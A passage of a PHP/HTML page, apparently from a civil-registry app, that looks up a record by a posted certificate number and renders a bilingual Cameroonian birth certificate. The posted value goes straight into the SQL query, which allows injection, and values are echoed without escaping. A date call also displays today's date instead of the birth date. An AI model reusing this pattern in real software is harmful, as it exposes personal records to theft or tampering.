<?php
if(isset($_POST['view'])){
	session_start();
	//import database connection
	include_once 'conndb.php';
	
	$bcnum = $_POST['bcnum'];

	//query to get information from the database.
	$sql = "SELECT * FROM BIRTH_CERTIFICATE a, PARENTS b 
	WHERE a.BCNumber = '$bcnum' AND b.BNumber = '$bcnum' ";

	$select = mysqli_query($conn, $sql) or die("Could not get the data".mysqli_error($conn));

	$row = mysqli_fetch_assoc($select) or die('Could not fetch the values'.mysqli_error($conn)); 

    $cdob = date("l d Y", time($row['CDOB'])); 
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
  <title>Certificate <?php echo $row['BCID'] ?></title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
  <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet" type="text/css" />
	<!-- icons -->
	<link href="fonts/simple-line-icons/simple-line-icons.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/material-design-icons/material-icon.css" rel="stylesheet" type="text/css" />
	<!--bootstrap -->
	<link href="../assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<!-- data tables -->
	<link href="../assets/plugins/datatables/plugins/bootstrap/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css" />
	<!-- Material Design Lite CSS -->
	<link rel="stylesheet" href="../assets/plugins/material/material.min.css">
	<link rel="stylesheet" href="../assets/css/material_style.css">
	<!-- Theme Styles -->
	<link href="../assets/css/theme/dark/theme_style.css" rel="stylesheet" id="rt_style_components" type="text/css" />
	<link href="../assets/css/theme/dark/style.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/plugins.min.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/responsive.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/theme/dark/theme-color.css" rel="stylesheet" type="text/css" />
	<!-- favicon -->
	<link rel="shortcut icon" href="http://radixtouch.in/templates/admin/smart/source/assets/img/favicon.ico" />
  <style type="text/css">
    a {text-decoration: none}
  </style>
</head>
<body text="#000000" link="#000000" alink="#000000" vlink="#000000">
	<div  id = "bc">
<table width="100%" cellpadding="0" cellspacing="0" border="0">
<tr><td width="50%">&nbsp;</td><td align="center">

<a name="JR_PAGE_ANCHOR_0_1"></a>
<table class="jrPage" cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 595px; border-collapse: collapse; background-color: white;">
<tr valign="top" style="height:0">
<td style="width:19px"></td>
<td style="width:1px"></td>
<td style="width:1px"></td>
<td style="width:1px"></td>
<td style="width:13px"></td>
<td style="width:4px"></td>
<td style="width:1px"></td>
<td style="width:20px"></td>
<td style="width:28px"></td>
<td style="width:1px"></td>
<td style="width:71px"></td>
<td style="width:14px"></td>
<td style="width:13px"></td>
<td style="width:13px"></td>
<td style="width:1px"></td>
<td style="width:9px"></td>
<td style="width:30px"></td>
<td style="width:7px"></td>
<td style="width:13px"></td>
<td style="width:81px"></td>
<td style="width:6px"></td>
<td style="width:13px"></td>
<td style="width:36px"></td>
<td style="width:1px"></td>
<td style="width:13px"></td>
<td style="width:11px"></td>
<td style="width:19px"></td>
<td style="width:100px"></td>
<td style="width:10px"></td>
<td style="width:10px"></td>
<td style="width:4px"></td>
<td style="width:5px"></td>
<td style="width:1px"></td>
<td style="width:4px"></td>
<td style="width:3px"></td>
<td style="width:1px"></td>
<td style="width:17px"></td>
</tr>
<tr valign="top" style="height:30px">
<td colspan="37">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="14">
</td>
<td colspan="11" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">REPUBLIQUE DU CAMEROUN</span></td>
<td colspan="12">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="18">
</td>
<td colspan="3" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Paix - Travail - Patrie</span></td>
<td colspan="16">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="16">
</td>
<td colspan="8" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">REPUBLIC OF CAMEROON</span></td>
<td colspan="13">
</td>
</tr>
<tr valign="top" style="height:10px">
<td colspan="17">
</td>
<td colspan="5" rowspan="3" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Peace - Work - Fatherland</span></td>
<td colspan="15">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="17">
</td>
<td colspan="5">
</td>
<td rowspan="4" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">REGION</span></td>
<td colspan="9">
</td>
</tr>
<tr valign="top" style="height:9px">
<td colspan="8">
</td>
<td colspan="3" rowspan="4" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">REGION</span></td>
<td colspan="6">
</td>
<td colspan="5">
</td>
<td colspan="9">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="8">
</td>
<td colspan="8">
</td>
<td style="border-top: 2px solid #000000; ">
</td>
<td colspan="7">
</td>
<td colspan="9">
</td>
</tr>
<tr valign="top" style="height:8px">
<td colspan="8">
</td>
<td colspan="16">
</td>
<td colspan="9">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="8">
</td>
<td colspan="26">
</td>
</tr>
<tr valign="top" style="height:19px">
<td colspan="7">
</td>
<td colspan="6" rowspan="3">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:22px"></td>
<td style="width:100px"></td>
<td style="width:25px"></td>
</tr>
<tr valign="top" style="height:18px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">DEPARTEMENT</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:7px"></td>
<td style="width:133px"></td>
<td style="width:7px"></td>
</tr>
<tr valign="top" style="height:19px">
<td colspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:140px"></td>
</tr>
<tr valign="top" style="height:17px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:20px"></td>
<td style="width:100px"></td>
<td style="width:20px"></td>
</tr>
<tr valign="top" style="height:19px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $_SESSION['region']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:18px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:33px">
<td>
</td>
<td colspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:130px"></td>
<td style="width:10px"></td>
</tr>
<tr valign="top" style="height:13px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">ARRONDISSEMENT</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:140px"></td>
</tr>
<tr valign="top" style="height:21px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:140px"></td>
</tr>
<tr valign="top" style="height:13px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:15px"></td>
<td style="width:100px"></td>
<td style="width:25px"></td>
</tr>
<tr valign="top" style="height:21px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $_SESSION['division']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
<tr valign="top" style="height:12px">
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="13">
</td>
<td colspan="4">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:139px"></td>
</tr>
<tr valign="top" style="height:18px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:19px"></td>
<td style="width:100px"></td>
<td style="width:20px"></td>
</tr>
<tr valign="top" style="height:19px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $_SESSION['region']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="7">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="7">
</td>
<td colspan="24">
</td>
</tr>
<tr valign="top" style="height:50px">
<td colspan="7">
</td>
<td colspan="13">
</td>
<td colspan="4" rowspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:19px"></td>
<td style="width:100px"></td>
<td style="width:20px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">DIVISION</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:139px"></td>
</tr>
<tr valign="top" style="height:17px">
<td>
</td>
</tr>
<tr valign="top" style="height:53px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:19px"></td>
<td style="width:100px"></td>
<td style="width:20px"></td>
</tr>
<tr valign="top" style="height:14px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">SUBDIVISION</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:18px"></td>
<td style="width:100px"></td>
<td style="width:21px"></td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="3">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:19px"></td>
<td style="width:100px"></td>
<td style="width:20px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $_SESSION['division']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:139px"></td>
</tr>
<tr valign="top" style="height:13px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
<tr valign="top" style="height:6px">
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
<tr valign="top" style="height:13px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $_SESSION['subdiv']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="7">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="8">
</td>
<td colspan="3" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $_SESSION['subdiv']; ?></span></td>
<td colspan="15">
</td>
<td colspan="7">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="5">
</td>
<td colspan="26">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:45px"></td>
<td style="width:198px"></td>
<td style="width:286px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 14px; line-height: 1.2578125; font-weight: bold;">CENTRE D'ETAT CIVIL</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:140px"></td>
<td style="width:85px"></td>
<td style="width:304px"></td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
<td rowspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:160px"></td>
<td style="width:139px"></td>
<td style="width:5px"></td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:304px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 14px; line-height: 1.2578125;">/ CIVIL STATUS REGISTRATION CENTRE</span></td>
</tr>
</table>
</div>
</div>
</td>
</tr>
<tr valign="top" style="height:19px">
<td colspan="2">
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="6">
</td>
</tr>
<tr valign="top" style="height:50px">
<td colspan="2">
</td>
<td colspan="27">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:70px"></td>
<td style="width:460px"></td>
</tr>
<tr valign="top" style="height:10px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:30px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 14px; line-height: 1.2578125; font-weight: bold;">De - Of</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:33px"></td>
<td style="width:17px"></td>
<td style="width:220px"></td>
<td style="width:258px"></td>
<td style="width:2px"></td>
</tr>
<tr valign="top" style="height:26px">
<td colspan="2">
</td>
<td colspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:478px"></td>
</tr>
<tr valign="top" style="height:25px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:460px"></td>
<td style="width:18px"></td>
</tr>
<tr valign="top" style="height:26px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 16px; line-height: 1.2578125;"><?php echo $_SESSION['subdiv']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:24px">
<td>
</td>
<td colspan="2" style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 18px; line-height: 1.2578125; font-weight: bold;">ACTE DE NAISSANCE</span></td>
<td colspan="2" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 18px; line-height: 1.2578125;">/ BIRTH CERTIFICATE</span></td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="8">
</td>
</tr>
<tr valign="top" style="height:84px">
<td>
</td>
<td colspan="33">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:124px"></td>
<td style="width:37px"></td>
<td style="width:394px"></td>
</tr>
<tr valign="top" style="height:4px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:24px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 15px; line-height: 1.2578125;">N°</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:139px"></td>
<td style="width:1px"></td>
<td style="width:277px"></td>
<td style="width:1px"></td>
<td style="width:137px"></td>
</tr>
<tr valign="top" style="height:24px">
<td colspan="2">
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 16px; line-height: 1.2578125;"><?php echo $row['BCID']; ?></span></td>
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td colspan="3" style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:59px">
<td colspan="5">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:115px"></td>
<td style="width:440px"></td>
</tr>
<tr valign="top" style="height:5px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Nom de l'enfant</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:554px"></td>
</tr>
<tr valign="top" style="height:59px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:110px"></td>
<td style="width:441px"></td>
<td style="width:3px"></td>
</tr>
<tr valign="top" style="height:29px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:110px"></td>
<td style="width:420px"></td>
<td style="width:24px"></td>
</tr>
<tr valign="top" style="height:30px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 20px; line-height: 1.2578125;"><?php echo $row['CName']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:100px"></td>
<td style="width:12px"></td>
<td style="width:4px"></td>
<td style="width:9px"></td>
<td style="width:418px"></td>
<td style="width:11px"></td>
</tr>
<tr valign="top" style="height:19px">
<td colspan="6">
</td>
</tr>
<tr valign="top" style="height:15px">
<td colspan="2" rowspan="2" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Name of the child</span></td>
<td colspan="4">
</td>
</tr>
<tr valign="top" style="height:5px">
<td colspan="2">
</td>
<td rowspan="2" style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;"><?php echo $cdob; ?></span></td>
<td>
</td>
</tr>
<tr valign="top" style="height:16px">
<td rowspan="3">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:70px"></td>
<td style="width:30px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Né le</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:31px"></td>
<td style="width:69px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">&nbsp; - Born on </span></td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="3">
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="2">
</td>
<td colspan="3" style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
<tr valign="top" style="height:3px">
<td colspan="5">
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:41px">
<td colspan="2">
</td>
<td colspan="32">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:50px"></td>
<td style="width:504px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">A</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:25px"></td>
<td style="width:50px"></td>
<td style="width:479px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- At</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:60px"></td>
<td style="width:494px"></td>
</tr>
<tr valign="top" style="height:16px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:551px"></td>
<td style="width:3px"></td>
</tr>
<tr valign="top" style="height:41px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
